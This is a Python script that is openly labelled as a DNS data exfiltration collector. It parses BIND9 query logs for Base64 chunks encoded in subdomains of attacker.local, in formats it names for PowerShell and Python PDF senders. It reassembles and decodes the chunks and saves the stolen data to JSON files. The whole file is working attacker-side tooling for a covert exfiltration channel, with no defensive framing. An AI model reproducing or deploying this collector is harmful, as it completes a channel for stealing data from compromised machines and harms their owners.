#!/usr/bin/env python3
# DNS Query Decoder for data exfiltration
# This script collects Base64 encoded data from BIND9 DNS query logs

import base64
import re
from collections import defaultdict
import json
from datetime import datetime

class DNSDecoder:
    def __init__(self, log_file="/var/log/named/query.log"):
        self.log_file = log_file
        self.data_chunks = defaultdict(dict)
        
    def parse_query(self, line):
        """Parse a DNS query line from BIND9 log - Updated for new formats."""
        # Look for different query patterns
        patterns = [
            # New PowerShell format: win0.encodeddata.attacker.local
            r'query: win(\d+)\.([^.\s]+)\.attacker\.local',
            # New Python PDF format: pdfd0.timestamp.encodeddata.attacker.local  
            r'query: pdf([^.\s]+)\.(\d+)\.([^.\s]+)\.attacker\.local',
            # Original format: chunk0.encodeddata.attacker.local
            r'query: chunk(\d+)\.([^.\s]+)\.attacker\.local',
            # Data format: data0.encodeddata.attacker.local
            r'query: data(\d+)\.([^.\s]+)\.attacker\.local',
            # Completion signals
            r'query: (complete|end)\.([^.\s]+)\.attacker\.local'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, line)
            if match:
                groups = match.groups()
                
                if 'pdf' in pattern:
                    # PDF format with timestamp
                    return {
                        'type': 'pdf',
                        'index': groups[0],  # chunk id
                        'timestamp': groups[1],
                        'data': groups[2],
                        'source': 'python_pdf'
                    }
                elif 'win' in pattern:
                    # PowerShell format
                    return {
                        'type': 'win',
                        'index': int(groups[0]),
                        'data': groups[1],
                        'source': 'powershell'
                    }
                elif 'complete' in pattern or 'end' in pattern:
                    # Completion signal
                    return {
                        'type': 'completion',
                        'signal': groups[0],
                        'data': groups[1] if len(groups) > 1 else '',
                        'source': 'completion'
                    }
                else:
                    # Original formats
                    return {
                        'type': 'data',
                        'index': int(groups[0]),
                        'data': groups[1],
                        'source': 'original'
                    }
        
        return None

    def combine_chunks(self, chunks):
        """Combine Base64 chunks without decoding."""
        try:
            sorted_chunks = sorted(chunks.items())
            combined_base64 = ''.join(chunk[1] for chunk in sorted_chunks)
            
            # Add padding if needed
            padding = len(combined_base64) % 4
            if padding:
                combined_base64 += '=' * (4 - padding)
                
            return combined_base64
        except Exception as e:
            return f"Error combining chunks: {str(e)}"

    def process_log(self):
        """Process the DNS query log file and collect exfiltrated data."""
        try:
            sessions = defaultdict(lambda: {'chunks': {}, 'metadata': {}, 'completion': False})
            
            with open(self.log_file, 'r') as f:
                for line in f:
                    parsed = self.parse_query(line)
                    if not parsed:
                        continue
                    
                    # Extract timestamp from log line
                    timestamp_match = re.search(r'(\d{2}-\w{3}-\d{4} \d{2}:\d{2}:\d{2}\.\d{3})', line)
                    log_timestamp = timestamp_match.group(1) if timestamp_match else "Unknown"
                    
                    # Group by source type and session
                    source = parsed.get('source', 'unknown')
                    session_id = f"{source}_{log_timestamp.split()[0]}"  # Group by source and date
                    
                    if parsed['type'] == 'completion':
                        sessions[session_id]['completion'] = True
                        sessions[session_id]['metadata']['completion_signal'] = parsed['signal']
                        sessions[session_id]['metadata']['completion_data'] = parsed.get('data', '')
                    else:
                        # Store data chunks
                        chunk_key = parsed['index']
                        sessions[session_id]['chunks'][chunk_key] = parsed['data']
                        sessions[session_id]['metadata']['source'] = source
                        sessions[session_id]['metadata']['last_seen'] = log_timestamp
                        
                        if 'timestamp' in parsed:
                            sessions[session_id]['metadata']['payload_timestamp'] = parsed['timestamp']
            
            # Process each session
            results = []
            for session_id, session_data in sessions.items():
                if not session_data['chunks']:
                    continue
                
                # Combine chunks
                combined_base64 = self.combine_chunks(session_data['chunks'])
                
                # Try to decode
                try:
                    decoded_data = base64.b64decode(combined_base64).decode('utf-8', errors='ignore')
                except Exception as e:
                    decoded_data = f"Decode error: {str(e)}"
                
                result = {
                    'session_id': session_id,
                    'source': session_data['metadata'].get('source', 'unknown'),
                    'timestamp': session_data['metadata'].get('last_seen', 'unknown'),
                    'chunk_count': len(session_data['chunks']),
                    'completed': session_data['completion'],
                    'raw_base64': combined_base64[:100] + '...' if len(combined_base64) > 100 else combined_base64,
                    'decoded_data': decoded_data,
                    'metadata': session_data['metadata']
                }
                results.append(result)
            
            return results
                    
        except FileNotFoundError:
            print(f"Error: Log file {self.log_file} not found")
            return []
        except Exception as e:
            print(f"Error processing log: {str(e)}")
    def save_output(self, results):
        """Save collected results to a JSON file."""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_file = f'exfiltrated_data_{timestamp}.json'
        
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=4)
        return output_file

def main():
    decoder = DNSDecoder()
    print("[+] Starting DNS exfiltration data collector...")
    print(f"[+] Monitoring log file: {decoder.log_file}")
    
    results = decoder.process_log()
    if not results:
        print("[-] No exfiltrated data found in DNS logs")
        return
    
    # Save to file
    output_file = decoder.save_output(results)
    print(f"[+] Exfiltrated data saved to: {output_file}")
    
    # Print summary
    print(f"\n[+] Found {len(results)} data sessions:")
    for result in results:
        print(f"\n--- Session: {result['session_id']} ---")
        print(f"Source: {result['source']}")
        print(f"Timestamp: {result['timestamp']}")
        print(f"Chunks: {result['chunk_count']}")
        print(f"Completed: {result['completed']}")
        print(f"Decoded Data: {result['decoded_data'][:100]}..." if len(result['decoded_data']) > 100 else f"Decoded Data: {result['decoded_data']}")

if __name__ == '__main__':
    main()
